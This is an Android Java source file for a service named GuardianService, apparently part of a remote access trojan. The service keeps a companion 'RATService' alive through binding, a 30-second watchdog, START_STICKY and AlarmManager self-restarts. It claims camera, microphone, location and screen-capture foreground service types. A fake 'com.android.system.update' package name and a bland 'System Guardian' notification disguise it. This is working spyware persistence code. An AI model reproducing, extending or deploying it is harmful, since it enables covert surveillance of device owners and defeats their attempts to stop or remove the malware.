package com.android.system.update;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.Timer;
import java.util.TimerTask;

public class GuardianService extends Service {
    
    private static final String TAG = "GuardianService";
    private static final long CHECK_INTERVAL = 30000; // 30 seconds
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "guardian_channel";
    
    private Timer timer;
    private boolean isBound = false;
    private RATService.RATServiceBinder ratServiceBinder;
    
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            if (service instanceof RATService.RATServiceBinder) {
                ratServiceBinder = (RATService.RATServiceBinder) service;
                isBound = true;
                Log.d(TAG, "Connected to RATService");
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            isBound = false;
            ratServiceBinder = null;
            Log.d(TAG, "Disconnected from RATService");
            
            // RATService crashed, restart it
            restartRATService();
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "GuardianService created");
        
        // IMPORTANT: Start as foreground service immediately
        startForegroundService();
        
        // Bind to RATService for monitoring
        bindToRATService();
        
        // Start monitoring timer
        startMonitoring();
    }
    
    private void startForegroundService() {
        // Create notification channel for Android O+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Guardian Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Monitors and maintains system services");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        
        // Build the notification
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Guardian")
            .setContentText("Monitoring system services")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();
        
        // Start as foreground service with appropriate service types for Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Combine all service types this service might need
            int foregroundServiceTypes = 0;
            
            // Add camera type for video streaming support
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            }
            
            // Add microphone type for audio recording
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
            }
            
            // Add location type for location tracking
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            }
            
            // Add data sync type for file transfers
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
            }
            
            // For Android 14+ (API 34+), also add media projection if needed
            if (Build.VERSION.SDK_INT >= 34) { // Android 14
                foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            }
            
            try {
                startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes);
                Log.d(TAG, "Started as foreground service with types: " + foregroundServiceTypes);
            } catch (Exception e) {
                // Fallback to standard startForeground if type combination fails
                Log.e(TAG, "Error starting foreground with types, falling back", e);
                startForeground(NOTIFICATION_ID, notification);
            }
        } else {
            // Pre-Android 10: simple startForeground
            startForeground(NOTIFICATION_ID, notification);
            Log.d(TAG, "Started as foreground service (legacy)");
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand called");
        
        // If service was restarted, ensure we're still in foreground
        if (intent == null) {
            // Service was restarted by system
            startForegroundService();
        }
        
        return START_STICKY; // Keep service alive
    }
    
    private void bindToRATService() {
        Intent intent = new Intent(this, RATService.class);
        bindService(intent, connection, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT);
    }
    
    private void startMonitoring() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkServices();
            }
        }, CHECK_INTERVAL, CHECK_INTERVAL);
    }
    
    private void checkServices() {
        // Check if RATService is running
        if (!isServiceRunning(RATService.class)) {
            restartRATService();
        }
        
        // If bound but connection died, reconnect
        if (!isBound) {
            bindToRATService();
        }
        
        // Send heartbeat to RATService if connected
        if (isBound && ratServiceBinder != null) {
            try {
                ratServiceBinder.heartbeat();
            } catch (RemoteException e) {
                Log.e(TAG, "Heartbeat failed", e);
                isBound = false;
                ratServiceBinder = null;
            }
        }
    }
    
    private void restartRATService() {
        Log.d(TAG, "Restarting RATService");
        Intent intent = new Intent(this, RATService.class);
        
        // Use startForegroundService for RATService on Android 8+ since it needs camera permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
            Log.d(TAG, "Started RATService as foreground service");
        } else {
            startService(intent);
            Log.d(TAG, "Started RATService as regular service");
        }
        
        // Try to rebind
        bindToRATService();
    }
    
    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : 
                manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service for external clients
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "GuardianService destroyed");
        
        if (timer != null) {
            timer.cancel();
        }
        if (isBound) {
            unbindService(connection);
        }
        
        // Reschedule self using AlarmManager
        scheduleRestart();
    }
    
    private void scheduleRestart() {
        android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, GuardianService.class);
        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getService(
            this, 0, intent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 5000, pendingIntent);
        } else {
            alarmManager.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 5000, pendingIntent);
        }
    }
}
